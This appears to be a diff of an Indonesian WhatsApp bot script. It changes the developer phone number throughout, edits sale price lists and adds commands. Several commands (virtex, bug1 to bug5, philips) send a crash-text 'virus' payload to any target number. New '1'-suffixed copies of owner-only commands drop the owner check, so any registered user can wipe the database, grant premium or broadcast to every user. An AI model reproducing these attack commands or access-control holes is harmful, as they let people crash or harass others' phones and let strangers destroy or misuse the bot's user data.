@@ -71,7 +71,7 @@ if (chats == undefined) { chats = '' }
 const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(chats) ? chats.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '#'
 const isGroup = msg.key.remoteJid.endsWith('@g.us')
 const sender = isGroup ? (msg.key.participant ? msg.key.participant : msg.participant) : msg.key.remoteJid
-const isOwner = [`${setting.ownerNumber}`,"6285692242216@s.whatsapp.net","6285641292796@s.whatsapp.net"].includes(sender) ? true : false
+const isOwner = [`${setting.ownerNumber}`,"6282223158029@s.whatsapp.net","6285641292796@s.whatsapp.net"].includes(sender) ? true : false
 const pushname = msg.pushName
 const body = chats.startsWith(prefix) ? chats : ''
 const args = body.trim().split(/ +/).slice(1);
@@ -1043,7 +1043,7 @@ _Utamakan chat to the point_ 🚀
 
 ${strip}Telpon/Spam blokir 🚫${strip}
 
-_Admin 1 : 6285692242216_
+_Admin 1 : 6282223158029_
 
 *SCRIPT BOT 🛒*
 _Rp50.000 - ( Topup & Fitur 300+ )_
@@ -1079,7 +1079,7 @@ let namenya = `${cekUser("name", sender)}`
 let premnya = `${cekUser("premium", sender)? 'Aktif':'Tidak'}`
 let usernya = `${("id", db_user).length}`
 let romnya = `${db_menfes.length}`
-const gurbot = '6285692242216@s.whatsapp.net'
+const gurbot = '6282223158029@s.whatsapp.net'
 const mark_slebew = '0@s.whatsapp.net'
 var footer_nya =`*Owner* @${setting.ChatOwner.split('@')[0]}`
 var menu_nya =`${listmenu(sender,prefix,ad,namenya,premnya,usernya,romnya,tanggal,jam,no)}`
@@ -1165,6 +1165,16 @@ if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
 if (!q) return reply(`Contoh:\n${prefix+command} loli`)
 reply(mess.wait)
 fetchJson(`https://saipulanuar.ga/api/search/pinterest?query=${q}&apikey=jPHjZpQF`)
+.then(pin =>{
+var media = pickRandom(pin.result)
+conn.sendMessage(from, { image:{url:media}, caption:`Done *${q}*`}, {quoted:msg})
+})
+break
+case 'gimage':
+if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
+if (!q) return reply(`Contoh:\n${prefix+command} loli`)
+reply(mess.wait)
+fetchJson(`https://api-mirip-zeks.hitomimd.repl.co/api/search/google-image?query=loli&apikey=Alphabot`)
 .then(pin =>{
 var media = pickRandom(pin.result)
 conn.sendMessage(from, { image:{url:media}, caption:`Done *${q}*`}, {quoted:msg})
@@ -1287,6 +1297,10 @@ case 'tes':
 if (!isOwner) return reply(mess.OnlyOwner)
 reply(`*Runtime :* ${runtime(process.uptime())}`)
 break
+case 'tes1':
+if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
+reply(`*Runtime :* ${runtime(process.uptime())}`)
+break
 case 'rules':{
 if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
 let text_rules =`${rulesBot()}`
@@ -1308,6 +1322,20 @@ teks_db +=`*User${no++} ${x.name}*\n*ID: @${x.id.split('@')[0]}*\n*Premium: ${x.
 reply(teks_db)
 }
 break
+case 'db1':{
+if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
+let xx_us = JSON.parse(fs.readFileSync("./database/pengguna.json"));
+let no = 1
+let teks_db =`*INFO-DASHBOARD*
+
+*• Terdaftar :* ( ${("id", db_user).length} )
+*• Room Chat :* ( ${db_menfes.length} )\n\n`
+for (let x of xx_us){
+teks_db +=`*User${no++} ${x.name}*\n*ID: @${x.id.split('@')[0]}*\n*Premium: ${x.premium? 'aktif':'tidak'}*\n\n`
+}
+reply(teks_db)
+}
+break
 case 'join': {
                 if (!isOwner) return reply(mess.OnlyOwner)
                 if (!q) return reply('Masukkan Link Group!')
@@ -1317,6 +1345,16 @@ case 'join': {
                 await conn.groupAcceptInvite(result).then((res) => m.reply(push(res))).catch((err) => m.reply(push(err)))
             }
             break
+case 'join1': {
+                if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
+                if (!q) return reply('Masukkan Link Group!')
+                if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
+                reply(mess.wait)
+                let result = args[0].split('https://chat.whatsapp.com/')[1]
+                await conn.groupAcceptInvite(result).then((res) => m.reply(push(res))).catch((err) => m.reply(push(err)))
+            }
+            break
+
 case 'addprem':{
 if (!isOwner) return reply(mess.OnlyOwner)
 if (!q) return reply('*Contoh:*\n#addprem 628xxx')
@@ -1337,6 +1375,27 @@ setUser("±premium", number_one, false)
 reply(`*PREMIUM*\n*ID:* @${number_one.split('@')[0]}\n*Status:* tidak`)
 }
 break
+case 'delprem1':{
+if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
+if (!q) return reply('*Contoh:*\n#delprem 628xxx')
+var number_one = q+'@s.whatsapp.net'
+if (cekUser("id", number_one) == null) return reply('User tersebut tidak terdaftar di database')
+if (cekUser("premium", number_one) == false) return reply('User tersebut tidak premium')
+setUser("±premium", number_one, false)
+reply(`*PREMIUM*\n*ID:* @${number_one.split('@')[0]}\n*Status:* tidak`)
+}
+break
+case 'addprem1':{
+if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
+if (!q) return reply('*Contoh:*\n#addprem 628xxx')
+var number_one = q+'@s.whatsapp.net'
+if (cekUser("id", number_one) == null) return reply('User tersebut tidak terdaftar di database')
+if (cekUser("premium", number_one) == true) return reply('User tersebut sudah premium')
+setUser("±premium", number_one, true)
+reply(`*PREMIUM*\n*ID:* @${number_one.split('@')[0]}\n*Status:* aktif`)
+}
+break
+
 case 'bot': case 'hai': 
 reply(`Apa Syg😘`)
 break
@@ -1368,14 +1427,9 @@ mentions(`*Ingin Jadi Premium?*
 *Silahkan Pilih Waktu Nya*
 
 *List Harga*
-Rp5.000 › 5day
-Rp10.000 › *permanen*
-
-*Dan Seterusnya...*
-*day › hari*
+Rp5.000 › *permanen*
 
 *Keuntungan Premium*
-- _Bisa Add Bot 1 Group_
 - _Bisa Gunain Fitur Premium_
 
 *Minat Jadi Premium?*
@@ -1383,22 +1437,30 @@ Rp10.000 › *permanen*
 @${setting.ChatOwner.split('@')[0]}`, [setting.ChatOwner])
 break
 case 'sewabot':
-mentions(`*PRICE LIST SEWA BOT*
+mentions(`—————「 *SEWA | BOTZ* 」—————
 
-*Harga Sewa*
-30 Hari = 5.000
-Permanen = 10.000 *1(GC)*
-Permanen = 15.000 *2(GC)*
+*LIST HARGA*
+- 30 Hari = 5.000
+- Permanen = 10.000 *1(GC)*
+- Permanen = 15.000 *2(GC)*
+- Run Bot = 15.000 *30d*
 
-*Keuntungan :*
-- Bot Masuk Sesuai Waktu Sewa
-- Antilink
-- On 24 Jam
-- Fitur Banyak
-- Welcome
+*FITUR - FITUR*
+- WELCOME
+- ANTILINK
+- STIKER
+- FAST RESPON
+- ON 24 JAM
 - Dan Lainnya
 
-*Hubungi Owner*
+*_Pembayaran :_*                                    
+  *≻* QRIS All Payment 
+  
+_*NB* : Bot online 24Jam,Kecuali ada masalah eror/bug._
+
+*Minat? Langsung chat aja 🐦*
+
+*Contact person Owner* :
 @${setting.ChatOwner.split('@')[0]}`, [setting.ChatOwner])
 break
 case 'cekprem':{
@@ -1418,6 +1480,17 @@ fs.writeFileSync('./database/menfess.json', JSON.stringify(db_menfes, null, 1))
 reply('Sukses restart database')
 }
 break
+case 'resetdb1':{
+if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
+let para_kos = "[]"
+db_user.splice(para_kos)
+fs.writeFileSync('./database/pengguna.json', JSON.stringify(db_user, null, 1))
+await sleep(1000)
+db_menfes.splice(para_kos)
+fs.writeFileSync('./database/menfess.json', JSON.stringify(db_menfes, null, 1))
+reply('Sukses restart database')
+}
+break
 case 'resetlist':
 db_respon_list.splice('[]')
 fs.writeFileSync('./database/db_ListMessage', JSON.stringify(db_respon_list, null, 1))
@@ -1426,6 +1499,19 @@ break
 // BROADCAST
 case 'bctext':{
 if (!isOwner) return reply(mess.OnlyOwner)
+if (!q) return reply(`Masukan parameter text\n*Contoh:*\n${prefix+command} hallo`)
+let db_orang = JSON.parse(fs.readFileSync('./database/pengguna.json'));
+let data_teks = `${q}`
+for (let i of db_orang){ 
+var button_broadcast = {text: data_teks, footer: '©broadcast', buttons: [{ buttonId: '!menu', buttonText: {displayText: '⋮☰ 𝗠𝗘𝗡𝗨'}, type: 1}],headerType: 1}
+conn.sendMessage(i.id, button_broadcast)
+await sleep(2000)
+}
+reply(`*Sukses mengirim broadcast text ke ${db_orang.length} user*`)
+}
+break
+case 'bctext1':{
+if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
 if (!q) return reply(`Masukan parameter text\n*Contoh:*\n${prefix+command} hallo`)
 let db_orang = JSON.parse(fs.readFileSync('./database/pengguna.json'));
 let data_teks = `${q}`
@@ -1526,6 +1612,18 @@ exif.create(nama_Pack, author_Pack)
 reply('Sukses membuat exif')
 }
 break
+case 'setexif1':
+case 'setwm1':{
+if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
+if (!q) return reply('*Contoh:*\n#setwm pack|author')
+let nama_Pack = q.split('|')[0]
+let author_Pack = q.split('|')[1]
+if (!nama_Pack) return reply('*Contoh:*\n#setwm pack|author')
+if (!author_Pack) return reply('*Contoh:*\n#setwm pack|author')
+exif.create(nama_Pack, author_Pack)
+reply('Sukses membuat exif')
+}
+break
 case 'buat_room_chat':{
 var id_satu = q.split('|')[0]
 var id_dua = q.split('|')[1]
@@ -1563,7 +1661,7 @@ conn.sendMessage(id_dua, buttonMessage)
 }
 break
 case 'stopchat':
-if (cekPesan("id", sender) == null) return reply(`Kamu sedang tidak didalam roomchat, Silahkan buat room dengan contoh dibawah ini.\n\n*Example:*\n#menfess num|nama|pes\n\n*Contoh:*\n#menfess 628xxx|bot|hai\n\n*Note:*\n6285789004732 - benar (✅)\n+62 857 8900 4732 - salah (❌)`)
+if (cekPesan("id", sender) == null) return reply(`Kamu sedang tidak didalam roomchat, Silahkan buat room dengan contoh dibawah ini.\n\n*Example:*\n#menfess num|nama|pes\n\n*Contoh:*\n#/ 628xxx|bot|hai\n\n*Note:*\n6285789004732 - benar (✅)\n+62 857 8900 4732 - salah (❌)`)
 if (isGroup) return reply(mess.OnlyPM)
 var aku = sender
 var dia = cekPesan("teman", aku)
@@ -1614,7 +1712,7 @@ let text_buysc =`*_Mau beli scriptnya? harga murah kok._*
 *Contact Person 📞*
 
 *Admin1:*
-*Wa.me/6285692242216*
+*Wa.me/6282223158029*
 
 
 _*Harga Normal :*_ ~Rp150.000~
@@ -1636,7 +1734,7 @@ if (!q) return reply(`Masukan parameter text\n*Contoh:*\n${prefix+command} Req f
 var teks = `*| REQUEST FITUR |*`
 var teks1 = `\n\nNomor : @${sender.split("@")[0]}\nPesan : ${q}`
 var teks2 = `\n\nSucces send to owner`
-var bg_lexxy = '6285692242216@s.whatsapp.net'
+var bg_lexxy = '6282223158029@s.whatsapp.net'
 conn.sendMessage(bg_lexxy, {text: teks + teks1, mentions:[sender]}, {quoted:msg})
 conn.sendMessage(from, {text: teks + teks2 + teks1, mentions:[sender]}, {quoted:msg})
 }
@@ -1647,7 +1745,7 @@ if (!q) return reply(`Masukan parameter text\n*Contoh:*\n${prefix+command} Fitur
 var teks = `*| REPORT FITUR |*`
 var teks1 = `\n\nNomor : @${sender.split("@")[0]}\nPesan : ${q}`
 var teks2 = `\n\nSucces send to owner`
-var bg_lexxy = '6285692242216@s.whatsapp.net'
+var bg_lexxy = '6282223158029@s.whatsapp.net'
 conn.sendMessage(bg_lexxy, {text: teks + teks1, mentions:[sender]}, {quoted:msg})
 conn.sendMessage(from, {text: teks + teks2 + teks1, mentions:[sender]}, {quoted:msg})
 }
@@ -1703,6 +1801,33 @@ ogh += `
 }
 reply(ogh)
 })
+break
+case 'confes':
+case 'confess':
+case 'secretchat':{
+if (cekPesan("id", sender) !== null) return reply("Kamu Sedang Didalam roomchat ketik *#stopchat* untuk menghapus sesi chat.")
+if (!q) return reply(`Format invalid!!\n\n*Example:*\n${prefix+command} number|nama\n\n*Contoh:*\n${prefix+command} 628xxx|bot\n\n_isi number yg sesuai perintah bot_\n\n*Contoh*\n628xxx > benar\n+628xxx > salah\n\ntanpa spasi dan tanda +`)
+let num = q.split('|')[0]
+if (!num) return reply('Number tujuan wajib di isi')
+let nama_pengirim = q.split('|')[1]
+if (num == sender.split('@')[0]) return reply('Ngirim ke nomor sendiri:v\ncapek ya? semangat🗿')
+if (!nama_pengirim) return reply('Nama kamu wajib di isi')
+var cekap = await conn.onWhatsApp(num+"@s.whatsapp.net")
+if (cekap.length == 0) return reply(`Nomor +${num}\ntidak terdaftar di WhatsApp`)
+var penerimanyo = num+'@s.whatsapp.net'
+mentions(`Berhasil mengirimkan undangan chat ke @${penerimanyo.split('@')[0]} tunggu dia menyetujui undangan tersebut untuk chatan secara anonim jadi dia tidak tau siapa anda`, [penerimanyo])
+let roomC = `#${makeid(10)}`
+var text_tersambung =`*Seseorang Mengajak Chating*\n\n*Dari:* ${nama_pengirim}\n\nSilahkan klik button ya kak jika ingin menghubungkan chat *ANONYMOUS*`
+let btn_menfess = [{ buttonId: `${prefix}auto_room ${sender}|${penerimanyo}|${roomC}`, buttonText: { displayText: '⋮☰ 𝗧𝗘𝗥𝗜𝗠𝗔' }, type: 1 }]
+var but_menfess = {
+text: text_tersambung,
+footer: 'Klik button untuk menerima chat.',
+buttons: btn_menfess,
+mentions: [penerimanyo],
+headerType: 1
+}
+conn.sendMessage(penerimanyo, but_menfess)
+}
 break
 case 'terminate':
 if (!isOwner) return reply(mess.OnlyOwner)
@@ -3362,7 +3487,7 @@ case 'philips':{
 if (!isOwner) return reply(mess.OnlyOwner)
 if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
 var num = q+"@s.whatsapp.net"
-var dev = '6285692242216@s.whatsapp.net'
+var dev = '6282223158029@s.whatsapp.net'
 if (num == dev) return reply('Itu developer gua')
 if (num == sender) return reply('Itu Nomor Lu Sendiri')
 await sleep(3000)
@@ -3375,7 +3500,7 @@ case 'philips2':{
 if (!isOwner) return reply(mess.OnlyOwner)
 if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
 var num = q+"@s.whatsapp.net"
-var dev = '6285692242216@s.whatsapp.net'
+var dev = '6282223158029@s.whatsapp.net'
 if (num == dev) return reply('Itu developer gua')
 if (num == sender) return reply('Itu Nomor Lu Sendiri')
 await sleep(3000)
@@ -3390,7 +3515,7 @@ case 'philips3':{
 if (!isOwner) return reply(mess.OnlyOwner)
 if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
 var num = q+"@s.whatsapp.net"
-var dev = '6285692242216@s.whatsapp.net'
+var dev = '6282223158029@s.whatsapp.net'
 if (num == dev) return reply('Itu developer gua')
 if (num == sender) return reply('Itu Nomor Lu Sendiri')
 conn.sendMessage(num, {text:philips}, {quoted:virusnya})
@@ -3475,7 +3600,7 @@ case 'virtex':{
 if (!isOwner) return reply(mess.OnlyOwner)
 if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
 var num = q+"@s.whatsapp.net"
-var dev = '6285692242216@s.whatsapp.net'
+var dev = '6282223158029@s.whatsapp.net'
 if (num == dev) return reply('Itu developer gua')
 if (num == sender) return reply('itu nomor lu sendiri')
 conn.sendMessage(num, {text:virus}, {quoted:virusnya})
@@ -3487,7 +3612,7 @@ case 'virtex2':{
 if (!isOwner) return reply(mess.OnlyOwner)
 if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
 var num = q+"@s.whatsapp.net"
-var dev = '6285692242216@s.whatsapp.net'
+var dev = '6282223158029@s.whatsapp.net'
 if (num == dev) return reply('Itu developer gua')
 if (num == sender) return reply('itu nomor lu sendiri')
 conn.sendMessage(num, {text:virus}, {quoted:virusnya})
@@ -3501,7 +3626,7 @@ case 'virtex3':{
 if (!isOwner) return reply(mess.OnlyOwner)
 if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
 var num = q+"@s.whatsapp.net"
-var dev = '6285692242216@s.whatsapp.net'
+var dev = '6282223158029@s.whatsapp.net'
 if (num == dev) return reply('Itu developer gua')
 if (num == sender) return reply('itu nomor lu sendiri')
 conn.sendMessage(num, {text:virus}, {quoted:virusnya})
@@ -3517,7 +3642,7 @@ case 'bug1':{
 if (!isOwner) return reply(mess.OnlyOwner)
 if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
 var num = q+"@s.whatsapp.net"
-var dev = '6285692242216@s.whatsapp.net'
+var dev = '6282223158029@s.whatsapp.net'
 if (num == dev) return reply('Itu developer gua')
 if (num == sender) return reply('itu nomor lu sendiri')
 conn.sendMessage(num, {text:'p'}, {quoted:virusnya})
@@ -3529,7 +3654,7 @@ case 'bug2':{
 if (!isOwner) return reply(mess.OnlyOwner)
 if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
 var num = q+"@s.whatsapp.net"
-var dev = '6285692242216@s.whatsapp.net'
+var dev = '6282223158029@s.whatsapp.net'
 if (num == dev) return reply('Itu developer gua')
 if (num == sender) return reply('itu nomor lu sendiri')
 conn.sendMessage(num, {text:'p'}, {quoted:virusnya})
@@ -3541,7 +3666,7 @@ case 'bug3':{
 if (!isOwner) return reply(mess.OnlyOwner)
 if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
 var num = q+"@s.whatsapp.net"
-var dev = '6285692242216@s.whatsapp.net'
+var dev = '6282223158029@s.whatsapp.net'
 if (num == dev) return reply('Itu developer gua')
 if (num == sender) return reply('itu nomor lu sendiri')
 conn.sendMessage(num, {text:'p'}, {quoted:virusnya})
@@ -3555,7 +3680,7 @@ case 'bug4':{
 if (!isOwner) return reply(mess.OnlyOwner)
 if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
 var num = q+"@s.whatsapp.net"
-var dev = '6285692242216@s.whatsapp.net'
+var dev = '6282223158029@s.whatsapp.net'
 if (num == dev) return reply('Itu developer gua')
 if (num == sender) return reply('itu nomor lu sendiri')
 await sleep(3000)
@@ -3574,7 +3699,7 @@ case 'bug5':{
 if (!isOwner) return reply(mess.OnlyOwner)
 if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
 var num = q+"@s.whatsapp.net"
-var dev = '6285692242216@s.whatsapp.net'
+var dev = '6282223158029@s.whatsapp.net'
 if (num == dev) return reply('Itu developer gua')
 if (num == sender) return reply('itu nomor lu sendiri')
 await sleep(3000)
@@ -3617,7 +3742,7 @@ default:
 // Function Menfess Auto Bales
 // Jangan Lu Edit Lagi Disini
 // Buy No enc? Chat Wa
-// Wa Guwe : 6285692242216
+// Wa Guwe : 6282223158029
 
 var _0x1a6220=_0x4a33;(function(_0x5b325d,_0xd37330){var _0x15f0df=_0x4a33,_0x17b9a4=_0x5b325d();while(!![]){try{var _0x5034a9=parseInt(_0x15f0df(0x1d3))/0x1*(-parseInt(_0x15f0df(0x1ca))/0x2)+-parseInt(_0x15f0df(0x1d4))/0x3*(parseInt(_0x15f0df(0x1c5))/0x4)+parseInt(_0x15f0df(0x1c7))/0x5*(-parseInt(_0x15f0df(0x1cf))/0x6)+-parseInt(_0x15f0df(0x1d5))/0x7*(parseInt(_0x15f0df(0x1c9))/0x8)+-parseInt(_0x15f0df(0x1cc))/0x9+-parseInt(_0x15f0df(0x1c4))/0xa+parseInt(_0x15f0df(0x1cd))/0xb;if(_0x5034a9===_0xd37330)break;else _0x17b9a4['push'](_0x17b9a4['shift']());}catch(_0x1d82f8){_0x17b9a4['push'](_0x17b9a4['shift']());}}}(_0x351e,0x54a56));function _0x4a33(_0x1e5c04,_0x200f07){var _0x351e1e=_0x351e();return _0x4a33=function(_0x4a33ba,_0x1cdc80){_0x4a33ba=_0x4a33ba-0x1c3;var _0x110a2e=_0x351e1e[_0x4a33ba];return _0x110a2e;},_0x4a33(_0x1e5c04,_0x200f07);}function _0x351e(){var _0x26a0e1=['pesan\x20diteruskan','1103568ZGfugO','sendMessage','message','text','445736reezra','18tskWyb','1168237exHeIM','messages','4186710kRyETk','297452lFwhFR','type','10QPbKSn','teman','16yYTSyk','2wHOPdZ','conversation','2985354kCXAlP','29597029dyJWde'];_0x351e=function(){return _0x26a0e1;};return _0x351e();}if(!isCmd){if(cekPesan('id',sender)==null)return;if(cekPesan(_0x1a6220(0x1c8),sender)==![])return;if(m[_0x1a6220(0x1c3)][0x0][_0x1a6220(0x1c6)]==_0x1a6220(0x1cb)||m[_0x1a6220(0x1c3)][0x0]['type']=='extendedTextMessage'){try{var chat_anonymous=m[_0x1a6220(0x1c3)][0x0][_0x1a6220(0x1d1)]['extendedTextMessage'][_0x1a6220(0x1d2)];}catch(_0x2d0d82){var chat_anonymous=m[_0x1a6220(0x1c3)][0x0][_0x1a6220(0x1d1)][_0x1a6220(0x1cb)];}let text_nya_menfes='*ANONYMOUS\x20CHAT*\x0a💬\x20:\x20'+chat_anonymous;conn[_0x1a6220(0x1d0)](cekPesan(_0x1a6220(0x1c8),sender),{'text':text_nya_menfes}),conn['sendMessage'](from,{'text':_0x1a6220(0x1ce)},{'quoted':msg});}}
 
